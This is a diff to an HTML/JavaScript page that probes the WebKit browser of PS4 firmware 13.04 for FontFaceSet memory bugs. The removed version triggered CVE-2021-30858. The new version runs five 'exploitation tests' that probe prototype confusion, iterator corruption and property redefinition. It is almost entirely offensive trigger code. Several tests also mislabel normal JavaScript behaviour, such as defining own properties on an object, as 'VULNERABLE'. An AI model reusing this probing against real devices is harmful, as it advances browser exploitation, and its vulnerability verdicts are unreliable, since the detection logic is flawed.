@@ -2,180 +2,494 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>CVE-2021-30858 Test</title>
+    <title>FontFaceSet Advanced Tests</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { font-family: monospace; background: #000; color: #0f0; padding: 20px; font-size: 14px; }
-        h1 { color: #f00; font-size: 24px; margin-bottom: 20px; text-align: center; border-bottom: 3px solid #f00; padding-bottom: 10px; }
-        .btn { padding: 15px 30px; background: #f00; border: none; color: #fff; margin: 10px; cursor: pointer; font-size: 16px; font-weight: bold; width: 100%; max-width: 400px; }
-        .section { background: #1a0000; border: 2px solid #f00; margin: 15px 0; padding: 20px; }
-        .title { color: #ff0; font-size: 18px; font-weight: bold; margin-bottom: 15px; }
-        .log { padding: 5px 0; border-bottom: 1px solid #333; }
-        .log:last-child { border-bottom: none; }
+        body { font-family: monospace; background: #000; color: #0f0; padding: 15px; font-size: 13px; }
+        h1 { color: #f00; font-size: 22px; margin-bottom: 15px; text-align: center; border-bottom: 3px solid #f00; padding-bottom: 10px; }
+        .btn { padding: 12px 25px; background: #f00; border: none; color: #fff; margin: 5px; cursor: pointer; font-size: 14px; font-weight: bold; width: 100%; max-width: 350px; }
+        .btn-container { text-align: center; margin-bottom: 15px; }
+        .section { background: #1a0000; border: 2px solid #f00; margin: 12px 0; padding: 15px; }
+        .title { color: #ff0; font-size: 16px; font-weight: bold; margin-bottom: 10px; border-bottom: 1px solid #ff0; padding-bottom: 5px; }
+        .log { padding: 4px 0; font-size: 12px; }
         .success { color: #0f0; font-weight: bold; }
         .fail { color: #f00; font-weight: bold; }
         .warn { color: #ff0; font-weight: bold; }
         .info { color: #0ff; }
-        pre { background: #111; border: 1px solid #333; padding: 10px; margin: 10px 0; overflow-x: auto; font-size: 12px; color: #0f0; }
+        .critical { color: #f0f; font-weight: bold; background: rgba(255,0,255,0.1); padding: 5px; }
     </style>
 </head>
 <body>
-    <h1>⚠️ CVE-2021-30858 FontFaceSet UAF Test ⚠️</h1>
+    <h1>🔥 FontFaceSet Advanced Exploitation Tests 🔥</h1>
     
-    <div style="text-align: center; margin-bottom: 20px;">
-        <button class="btn" onclick="runTest()">🔥 TEST CVE-2021-30858</button>
+    <div class="btn-container">
+        <button class="btn" onclick="test1()">Test 1: Prototype Confusion</button>
+        <button class="btn" onclick="test2()">Test 2: Property Manipulation</button>
+        <button class="btn" onclick="test3()">Test 3: Iterator Corruption</button>
+        <button class="btn" onclick="test4()">Test 4: defineProperty Attack</button>
+        <button class="btn" onclick="test5()">Test 5: Recursive Operations</button>
+        <button class="btn" onclick="runAll()">▶ RUN ALL TESTS</button>
     </div>
     
     <div class="section">
-        <div class="title">📋 Test Log</div>
+        <div class="title">📋 Test Results</div>
         <div id="log"></div>
     </div>
 
 <script>
+var testResults = [];
+
 function log(msg, type) {
     var div = document.createElement('div');
     div.className = 'log ' + (type || '');
-    div.textContent = '[' + new Date().toISOString().substr(11, 12) + '] ' + msg;
+    div.textContent = msg;
     document.getElementById('log').appendChild(div);
-    document.getElementById('log').scrollTop = document.getElementById('log').scrollHeight;
 }
 
-function runTest() {
+function separator() {
+    log('═'.repeat(70), 'info');
+}
+
+function clearLog() {
     document.getElementById('log').innerHTML = '';
-    
-    log('='.repeat(60), 'info');
-    log('CVE-2021-30858: FontFaceSet Use-After-Free Test', 'warn');
-    log('PS4 Firmware: 13.04 | WebKit: 605.1.15', 'info');
-    log('='.repeat(60), 'info');
+    testResults = [];
+}
+
+// ============================================
+// TEST 1: PROTOTYPE CONFUSION (June 2024 Bug)
+// ============================================
+function test1() {
+    clearLog();
+    separator();
+    log('TEST 1: FontFaceSet Prototype Confusion', 'warn');
+    log('Based on June 2024 vulnerability (makes unconfigurable properties configurable)', 'info');
+    separator();
     log('', '');
-    
-    // Step 1: Check prerequisites
-    log('[STEP 1] Checking prerequisites...', 'info');
-    
-    if (typeof FontFace === 'undefined') {
-        log('✗ FAIL: FontFace not available', 'fail');
-        return;
-    }
-    log('✓ FontFace available', 'success');
-    
-    if (typeof FontFaceSet === 'undefined') {
-        log('✗ FAIL: FontFaceSet not available', 'fail');
-        return;
-    }
-    log('✓ FontFaceSet available', 'success');
-    
-    log('', '');
-    
-    // Step 2: Original PoC from Maddie Stone (Google Project Zero)
-    log('[STEP 2] Testing original CVE-2021-30858 PoC...', 'info');
-    log('Creating invalid FontFace object...', 'info');
     
     try {
-        // Create a FontFace with invalid source - this should fail
-        var fontFace1 = new FontFace("font1", "", {});
-        log('✓ Created FontFace: font1', 'success');
+        log('[1.1] Creating FontFace with prototype manipulation...', 'info');
         
-        // Create a FontFaceSet with the invalid font
-        log('Creating FontFaceSet with invalid font...', 'info');
-        var fontFaceSet = new FontFaceSet([fontFace1]);
-        log('✓ Created FontFaceSet', 'success');
-        
-        // Try to change the family - this triggers the bug in vulnerable versions
-        log('Changing font family (triggers bug)...', 'info');
-        fontFace1.family = "font2";
-        log('✓ Changed family to: font2', 'success');
-        
-        log('', '');
-        log('[RESULT] FontFaceSet operations succeeded', 'warn');
-        log('This means the constructor does NOT throw an error', 'warn');
-        log('Testing if UAF is exploitable...', 'info');
-        log('', '');
-        
-        // Step 3: Try to trigger the UAF
-        log('[STEP 3] Attempting to trigger Use-After-Free...', 'info');
-        
-        // Delete the font from the set
-        var deleted = fontFaceSet.delete(fontFace1);
-        log('fontFaceSet.delete() returned: ' + deleted, deleted ? 'warn' : 'info');
-        
-        // Check if the font is still in the set (it shouldn't be)
-        var hasFont = fontFaceSet.has(fontFace1);
-        log('fontFaceSet.has() returned: ' + hasFont, hasFont ? 'fail' : 'success');
-        
-        if (hasFont) {
-            log('⚠️ WARNING: Font still in set after delete!', 'warn');
-            log('This indicates improper cleanup - UAF possible!', 'warn');
-        } else {
-            log('✓ Font properly removed from set', 'success');
+        // Inherit from Function to get prototype property
+        function MyFontFace() {
+            return Reflect.construct(FontFace, ["test", ""], new.target);
         }
-        
-        log('', '');
-        
-        // Step 4: Try to access the freed object
-        log('[STEP 4] Attempting to access potentially freed memory...', 'info');
+        MyFontFace.prototype = Object.create(Function.prototype);
         
         try {
-            // Try to iterate over the set
-            var count = 0;
-            fontFaceSet.forEach(function(font) {
-                count++;
-                log('Found font in set: ' + font.family, 'warn');
-            });
-            log('FontFaceSet.forEach() found ' + count + ' fonts', count > 0 ? 'warn' : 'success');
+            var ff = new MyFontFace();
+            log('✓ Created custom FontFace', 'success');
             
-            // Try to get size
-            log('FontFaceSet.size: ' + fontFaceSet.size, fontFaceSet.size > 0 ? 'warn' : 'success');
+            // Try to make prototype configurable
+            log('[1.2] Attempting to make prototype configurable...', 'info');
+            
+            try {
+                Object.defineProperty(ff, 'prototype', {
+                    configurable: true,
+                    value: {}
+                });
+                log('⚠️ CRITICAL: prototype became configurable!', 'critical');
+                testResults.push('Test 1: VULNERABLE - Prototype confusion possible');
+                
+            } catch(e) {
+                log('✗ defineProperty blocked: ' + e.message, 'fail');
+                testResults.push('Test 1: SAFE - Prototype protected');
+            }
             
         } catch(e) {
-            log('✗ ERROR during access: ' + e.message, 'fail');
-            log('Error name: ' + e.name, 'fail');
-            if (e.stack) {
-                log('Stack trace:', 'fail');
-                log(e.stack, 'fail');
+            log('✗ Custom FontFace creation failed: ' + e.message, 'fail');
+        }
+        
+        // Alternative approach using __defineGetter__
+        log('', '');
+        log('[1.3] Testing __defineGetter__ on prototype...', 'info');
+        
+        try {
+            var ff2 = new FontFace("test2", "");
+            ff2.__defineGetter__('prototype', function() {
+                log('⚠️ CRITICAL: Getter called on prototype!', 'critical');
+                return {};
+            });
+            
+            var proto = ff2.prototype;
+            log('Prototype access returned: ' + typeof proto, 'warn');
+            
+            if (typeof proto !== 'undefined') {
+                log('⚠️ WARNING: Prototype getter works!', 'warn');
             }
+            
+        } catch(e) {
+            log('✗ Getter blocked: ' + e.message, 'fail');
         }
         
     } catch(e) {
-        log('', '');
-        log('✗ EXCEPTION CAUGHT!', 'fail');
-        log('Error: ' + e.message, 'fail');
-        log('Error name: ' + e.name, 'fail');
-        log('', '');
-        
-        if (e.message.includes('constructor') || e.message.includes('not a constructor')) {
-            log('[ANALYSIS] FontFaceSet constructor throws error', 'info');
-            log('This means CVE-2021-30858 is NOT exploitable via this method', 'info');
-            log('WebKit version may have protections', 'info');
-        } else {
-            log('[ANALYSIS] Unexpected error - investigating...', 'warn');
-        }
-        
-        if (e.stack) {
-            log('', '');
-            log('Stack trace:', 'fail');
-            var pre = document.createElement('pre');
-            pre.textContent = e.stack;
-            document.getElementById('log').appendChild(pre);
-        }
+        log('✗ Test 1 failed: ' + e.message, 'fail');
     }
     
+    separator();
+}
+
+// ============================================
+// TEST 2: PROPERTY MANIPULATION
+// ============================================
+function test2() {
+    clearLog();
+    separator();
+    log('TEST 2: FontFace Property Manipulation', 'warn');
+    log('Testing type confusion via property modification', 'info');
+    separator();
     log('', '');
-    log('='.repeat(60), 'info');
-    log('Test Complete', 'info');
-    log('='.repeat(60), 'info');
+    
+    try {
+        var ff = new FontFace("exploit", "");
+        var ffs = new FontFaceSet([ff]);
+        
+        log('[2.1] Testing family property mutation...', 'info');
+        
+        // Store original family
+        var origFamily = ff.family;
+        log('Original family: ' + origFamily, 'info');
+        
+        // Try different family values
+        var testValues = [
+            { val: null, desc: 'null' },
+            { val: undefined, desc: 'undefined' },
+            { val: {}, desc: 'object' },
+            { val: [], desc: 'array' },
+            { val: function(){}, desc: 'function' },
+            { val: Symbol('test'), desc: 'symbol' }
+        ];
+        
+        for (var i = 0; i < testValues.length; i++) {
+            try {
+                ff.family = testValues[i].val;
+                log('✓ Set family to ' + testValues[i].desc + ': ' + ff.family, 'success');
+                
+                // Check if FontFaceSet is still valid
+                var size = ffs.size;
+                var has = ffs.has(ff);
+                
+                if (!has && size > 0) {
+                    log('⚠️ CRITICAL: FontFaceSet inconsistent state!', 'critical');
+                    log('Size: ' + size + ', has(ff): ' + has, 'warn');
+                    testResults.push('Test 2: VULNERABLE - Inconsistent state detected');
+                }
+                
+            } catch(e) {
+                log('✗ ' + testValues[i].desc + ' rejected: ' + e.message, 'fail');
+            }
+        }
+        
+        log('', '');
+        log('[2.2] Testing descriptor property mutation...', 'info');
+        
+        try {
+            // Try to corrupt descriptor
+            ff.descriptor = "corrupted";
+            log('Set descriptor to: ' + ff.descriptor, 'warn');
+        } catch(e) {
+            log('✗ Descriptor mutation blocked: ' + e.message, 'fail');
+        }
+        
+    } catch(e) {
+        log('✗ Test 2 failed: ' + e.message, 'fail');
+    }
+    
+    separator();
+}
+
+// ============================================
+// TEST 3: ITERATOR CORRUPTION
+// ============================================
+function test3() {
+    clearLog();
+    separator();
+    log('TEST 3: FontFaceSet Iterator Corruption', 'warn');
+    log('Testing iterator manipulation during iteration', 'info');
+    separator();
+    log('', '');
+    
+    try {
+        var fonts = [];
+        for (var i = 0; i < 10; i++) {
+            fonts.push(new FontFace("font" + i, ""));
+        }
+        
+        var ffs = new FontFaceSet(fonts);
+        log('Created FontFaceSet with ' + ffs.size + ' fonts', 'info');
+        log('', '');
+        
+        log('[3.1] Modifying set during iteration...', 'info');
+        
+        var iterCount = 0;
+        var deleted = false;
+        
+        try {
+            ffs.forEach(function(font, key, set) {
+                iterCount++;
+                log('Iteration ' + iterCount + ': ' + font.family, 'info');
+                
+                // Try to delete during iteration
+                if (iterCount === 5 && !deleted) {
+                    log('Deleting fonts during iteration...', 'warn');
+                    
+                    // Delete current font
+                    var delResult = set.delete(font);
+                    log('delete(current) returned: ' + delResult, delResult ? 'warn' : 'info');
+                    
+                    // Try to delete another font
+                    if (fonts[7]) {
+                        var delResult2 = set.delete(fonts[7]);
+                        log('delete(fonts[7]) returned: ' + delResult2, delResult2 ? 'warn' : 'info');
+                    }
+                    
+                    // Try to add new font
+                    var newFont = new FontFace("injected", "");
+                    set.add(newFont);
+                    log('Added new font during iteration', 'warn');
+                    
+                    deleted = true;
+                }
+            });
+            
+            log('', '');
+            log('Total iterations: ' + iterCount, 'info');
+            log('Final set size: ' + ffs.size, 'info');
+            
+            if (iterCount !== ffs.size && iterCount !== fonts.length) {
+                log('⚠️ WARNING: Iteration count mismatch!', 'warn');
+                testResults.push('Test 3: INTERESTING - Iterator behavior anomaly');
+            }
+            
+        } catch(e) {
+            log('✗ Iterator error: ' + e.message, 'fail');
+            log('This might indicate corruption!', 'warn');
+            testResults.push('Test 3: VULNERABLE - Iterator crashed');
+        }
+        
+    } catch(e) {
+        log('✗ Test 3 failed: ' + e.message, 'fail');
+    }
+    
+    separator();
+}
+
+// ============================================
+// TEST 4: defineProperty ATTACK
+// ============================================
+function test4() {
+    clearLog();
+    separator();
+    log('TEST 4: Object.defineProperty on FontFace', 'warn');
+    log('Testing property descriptor manipulation', 'info');
+    separator();
+    log('', '');
+    
+    try {
+        var ff = new FontFace("test", "");
+        var ffs = new FontFaceSet([ff]);
+        
+        log('[4.1] Getting property descriptors...', 'info');
+        
+        var props = ['family', 'style', 'weight', 'stretch', 'unicodeRange', 'variant', 'featureSettings'];
+        
+        for (var i = 0; i < props.length; i++) {
+            var desc = Object.getOwnPropertyDescriptor(ff, props[i]);
+            if (desc) {
+                log(props[i] + ': configurable=' + desc.configurable + ', writable=' + desc.writable, 'info');
+            }
+        }
+        
+        log('', '');
+        log('[4.2] Attempting to redefine properties...', 'info');
+        
+        try {
+            Object.defineProperty(ff, 'family', {
+                get: function() {
+                    log('⚠️ CRITICAL: Custom getter called!', 'critical');
+                    return 'hacked';
+                },
+                configurable: true
+            });
+            
+            var fam = ff.family;
+            log('Family after redefine: ' + fam, fam === 'hacked' ? 'critical' : 'info');
+            
+            if (fam === 'hacked') {
+                testResults.push('Test 4: VULNERABLE - Property redefinition works');
+            }
+            
+        } catch(e) {
+            log('✗ Redefine blocked: ' + e.message, 'fail');
+        }
+        
+        log('', '');
+        log('[4.3] Testing length property on FontFaceSet...', 'info');
+        
+        try {
+            Object.defineProperty(ffs, 'size', {
+                value: 999999,
+                writable: true
+            });
+            
+            log('FontFaceSet.size after redefine: ' + ffs.size, ffs.size === 999999 ? 'critical' : 'info');
+            
+            if (ffs.size === 999999) {
+                log('⚠️ CRITICAL: Size corrupted!', 'critical');
+                testResults.push('Test 4: VULNERABLE - Size property corruption');
+            }
+            
+        } catch(e) {
+            log('✗ Size redefine blocked: ' + e.message, 'fail');
+        }
+        
+    } catch(e) {
+        log('✗ Test 4 failed: ' + e.message, 'fail');
+    }
+    
+    separator();
+}
+
+// ============================================
+// TEST 5: RECURSIVE OPERATIONS
+// ============================================
+function test5() {
+    clearLog();
+    separator();
+    log('TEST 5: Recursive FontFaceSet Operations', 'warn');
+    log('Testing deep recursion and re-entrancy', 'info');
+    separator();
+    log('', '');
+    
+    try {
+        log('[5.1] Creating recursive getter...', 'info');
+        
+        var callCount = 0;
+        var ff = new FontFace("test", "");
+        
+        try {
+            ff.__defineGetter__('family', function() {
+                callCount++;
+                if (callCount > 100) {
+                    log('Recursion stopped at ' + callCount, 'warn');
+                    return 'stopped';
+                }
+                
+                // Recursive call
+                return this.family;
+            });
+            
+            var fam = ff.family;
+            log('Recursive getter result: ' + fam, 'info');
+            log('Call count: ' + callCount, callCount > 50 ? 'warn' : 'info');
+            
+        } catch(e) {
+            log('✗ Recursive getter error: ' + e.message, 'fail');
+            if (e.message.includes('stack') || e.message.includes('recursion')) {
+                log('Stack overflow detected at call ' + callCount, 'warn');
+            }
+        }
+        
+        log('', '');
+        log('[5.2] Re-entrant operations...', 'info');
+        
+        var reentryCount = 0;
+        var ffs = new FontFaceSet([]);
+        
+        var reentrantFont = new FontFace("reentrant", "");
+        
+        try {
+            reentrantFont.__defineGetter__('family', function() {
+                reentryCount++;
+                
+                if (reentryCount === 1) {
+                    log('Re-entering: Adding to set during property access...', 'warn');
+                    
+                    // Try to modify the set while accessing font property
+                    ffs.add(new FontFace("injected", ""));
+                    log('Set size during re-entry: ' + ffs.size, 'warn');
+                }
+                
+                return "reentrant" + reentryCount;
+            });
+            
+            ffs.add(reentrantFont);
+            
+            // Trigger the getter
+            ffs.forEach(function(f) {
+                log('Font: ' + f.family, 'info');
+            });
+            
+            log('Re-entry count: ' + reentryCount, reentryCount > 1 ? 'warn' : 'info');
+            
+        } catch(e) {
+            log('✗ Re-entrant operation error: ' + e.message, 'fail');
+        }
+        
+    } catch(e) {
+        log('✗ Test 5 failed: ' + e.message, 'fail');
+    }
+    
+    separator();
+}
+
+// ============================================
+// RUN ALL TESTS
+// ============================================
+function runAll() {
+    clearLog();
+    separator();
+    log('RUNNING ALL FONTFACESET ADVANCED TESTS', 'warn');
+    log('PS4 Firmware 13.04 | WebKit 605.1.15', 'info');
+    separator();
+    log('', '');
+    
+    setTimeout(function() { test1(); }, 100);
+    setTimeout(function() { 
+        log('', '');
+        test2(); 
+    }, 500);
+    setTimeout(function() { 
+        log('', '');
+        test3(); 
+    }, 900);
+    setTimeout(function() { 
+        log('', '');
+        test4(); 
+    }, 1300);
+    setTimeout(function() { 
+        log('', '');
+        test5(); 
+        
+        // Summary
+        setTimeout(function() {
+            log('', '');
+            separator();
+            log('TEST SUMMARY', 'warn');
+            separator();
+            
+            if (testResults.length === 0) {
+                log('All tests passed - No vulnerabilities found', 'success');
+            } else {
+                for (var i = 0; i < testResults.length; i++) {
+                    log(testResults[i], 'warn');
+                }
+            }
+            
+            separator();
+        }, 100);
+        
+    }, 1700);
 }
 
 window.onerror = function(msg, url, line, col, error) {
     log('', '');
-    log('💥 CRASH DETECTED!', 'fail');
-    log('Message: ' + msg, 'fail');
-    log('Line: ' + line + ', Column: ' + col, 'fail');
+    log('💥 CRASH DETECTED!', 'critical');
+    log('Message: ' + msg, 'critical');
+    log('Line: ' + line, 'critical');
     if (error && error.stack) {
-        log('Stack:', 'fail');
-        var pre = document.createElement('pre');
-        pre.textContent = error.stack;
-        document.getElementById('log').appendChild(pre);
+        log('Stack: ' + error.stack.substring(0, 200), 'critical');
     }
+    testResults.push('CRASH: ' + msg);
     return true;
 };
 </script>
